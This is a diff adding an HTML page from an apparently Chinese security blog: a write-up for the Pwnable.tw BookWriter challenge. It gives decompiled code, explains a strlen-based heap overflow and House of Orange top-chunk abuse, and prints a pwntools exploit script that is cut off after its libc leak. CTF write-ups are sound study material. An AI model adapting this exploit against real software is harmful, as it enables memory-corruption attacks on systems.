@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="Pwnable.tw-BookWriter
+Author: 堇姬Naup
+
+libcglibc all in one 中沒有 2.23-0ubuntu5所以去網路上找libchttps://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu5
+把"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="Pwnable.tw-BookWriter"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="Pwnable.tw-BookWriter
+Author: 堇姬Naup
+
+libcglibc all in one 中沒有 2.23-0ubuntu5所以去網路上找libchttps://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu5
+把"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg4.jpg"/>
+
+
+<!-- Title -->
+
+<title>Pwnable.tw-BookWriter | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg4.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>Pwnable.tw-BookWriter</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-10-02
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="Pwnable-tw-BookWriter"><a href="#Pwnable-tw-BookWriter" class="headerlink" title="Pwnable.tw-BookWriter"></a>Pwnable.tw-BookWriter</h1><blockquote>
+<p>Author: 堇姬Naup</p>
+</blockquote>
+<h2 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h2><p>glibc all in one 中沒有 2.23-0ubuntu5<br>所以去網路上找libc<br><a target="_blank" rel="noopener" href="https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu5">https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu5</a></p>
+<p>把amd64載下來</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -X libc6_2.23-0ubuntu5_amd64.deb .</span><br></pre></td></tr></table></figure>
+<p>在libs裡面就有ld跟libc了</p>
+<p>patchelf直接patch上去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ld-2.23.so bookwriter</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc-2.23.so bookwriter</span><br></pre></td></tr></table></figure>
+
+<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the BookWriter !&quot;</span>);</span><br><span class="line">  Author();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( choice_f() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        ADD();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        VIEW();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        EDIT();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        INFOR();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">Author</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Author :&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read_f((__int64)&amp;input_author, <span class="number">0x40</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>輸入一個Author，大小為0x40</p>
+<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;      BookWriter      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Add a page        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. View a page       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Edit a page       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Information       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 5. Exit              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>有四種功能</p>
+<h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ADD</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> *chunk; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t add new page anymore!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(&amp;heap_arr)[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size of page :&quot;</span>);</span><br><span class="line">  size = choice_f();</span><br><span class="line">  chunk = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">  read_f((__int64)chunk, size);</span><br><span class="line">  (&amp;heap_arr)[i] = chunk;</span><br><span class="line">  size_arr[i] = size;</span><br><span class="line">  ++dword_602040;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="VIEW"><a href="#VIEW" class="headerlink" title="VIEW"></a>VIEW</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">VIEW</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index of page :&quot;</span>);</span><br><span class="line">  idx = choice_f();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;out of page:&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(&amp;heap_arr)[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Not found !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page #%u \n&quot;</span>, idx);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Content :\n%s\n&quot;</span>, (&amp;heap_arr)[idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="EDIT"><a href="#EDIT" class="headerlink" title="EDIT"></a>EDIT</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">EDIT</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index of page :&quot;</span>);</span><br><span class="line">  v1 = choice_f();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;out of page:&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !(&amp;heap_arr)[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Not found !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  read_f((__int64)(&amp;heap_arr)[v1], size_arr[v1]);</span><br><span class="line">  size_arr[v1] = <span class="built_in">strlen</span>((&amp;heap_arr)[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="INFOR"><a href="#INFOR" class="headerlink" title="INFOR"></a>INFOR</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">INFOR</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Author : %s\n&quot;</span>, input_author);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page : %u\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)dword_602040);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    Author();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="leak-libc-leak-heap"><a href="#leak-libc-leak-heap" class="headerlink" title="leak libc &amp; leak heap"></a>leak libc &amp; leak heap</h3><p>author緊鄰heap arr，可以用來leak heap，直接info收就可以了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000602060</span> input_author    db <span class="number">40</span>h <span class="title function_">dup</span><span class="params">(?)</span>           ; DATA XREF: Author+<span class="number">18</span>↑o</span><br><span class="line">.bss:<span class="number">0000000000602060</span>                                         ; INFOR+<span class="number">1</span>E↑o</span><br><span class="line">.bss:<span class="number">00000000006020</span>A0 ; <span class="type">char</span> *heap_arr</span><br><span class="line">.bss:<span class="number">00000000006020</span>A0 heap_arr        dq ?                    ; DATA XREF: ADD+<span class="number">1F</span>↑r</span><br><span class="line">.bss:<span class="number">00000000006020</span>A0                                         ; ADD+A2↑w ...</span><br></pre></td></tr></table></figure>
+
+<p>接下來edit中長度控制是從size arr中獲得的<br>但是size arr會在每次edit時候根據strlen heap arr去做修改，然而當我把prev size覆蓋掉時，top chunk size就會被算進去，這樣導致heap overflow</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read_f((__int64)(&amp;heap_arr)[v1], size_arr[v1]);</span><br><span class="line">size_arr[v1] = <span class="built_in">strlen</span>((&amp;heap_arr)[v1]);</span><br></pre></td></tr></table></figure>
+
+<p>這邊就可以打 house of orange了<br>當我們malloc大小大於top chunk剩餘空間，且FastBin、SmallBin、LargeBin、UnsortedBin都不能找到可以對應的空間時候，ptmalloc會調用brk&#x2F;mmap申請一塊新的空間，原來的top chunk會被加到unsorted bin中</p>
+<p>不過有以下限制</p>
+<ol>
+<li>malloc chunk size &lt; mmp_.mmap_threshold (默認128KB，也就是0x20000)，不然會直接syscall mmap</li>
+<li>Top Chunk size要對齊page(0x1000)</li>
+<li>Top chunk size &gt; MINSIZE(0x10)</li>
+<li>Top Chunk的Size &lt; malloc chunk size + MINSIZE</li>
+<li>Top Chunk Size Pbit &#x3D; 1</li>
+</ol>
+<p>然而要達成這條件實際上可以透過只修改高位top chunk size來bypass<br>0x20fd1 -&gt; 0xfd1</p>
+<p>在malloc 0x1000<br>就可以拿到一塊unsorted bin了</p>
+<p>然而我這樣做就爛了，原因是因為只要有輸入就會自動補一個NULL bytes，原來是因為read function會把\n改成\x00<br>我們可以透過malloc 0x0來bypass</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./bookwriter&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc chall.pwnable.tw 10304&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p_c(r,<span class="string">&#x27;b *0x400ce4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### heap I/O</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size of page :&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Content :&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index of page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index of page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Content:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">sla(<span class="string">b&#x27;Author :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x28</span> ,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0xfd1</span>))</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;222&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">rcu(<span class="string">b&#x27;Content :\n&#x27;</span>)</span><br><span class="line">leaklibc = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#print(type(leaklibc))</span></span><br><span class="line">libcbase = leaklibc - <span class="number">0x3c4188</span> </span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">rcu(<span class="string">b&#x27;Author : 